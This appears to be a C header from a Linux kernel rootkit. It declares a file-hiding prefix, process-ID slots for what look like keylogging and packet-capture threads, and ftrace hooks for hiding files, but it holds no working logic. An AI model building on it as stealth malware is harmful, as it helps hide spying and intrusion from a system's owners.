// libpcap_hooks.h
#ifndef HIDE_FILES_H
#define HIDE_FILES_H

#define PREFIX "pemp"
#define PID_MAX 10
extern char keys_kthread_pid[PID_MAX];
extern char packets_kthread_pid[PID_MAX];
extern char keys_worker[PID_MAX];
extern char packets_worker[PID_MAX];
extern char hide_pid[PID_MAX];
extern struct ftrace_hook hide_files_hooks[];



#endif 
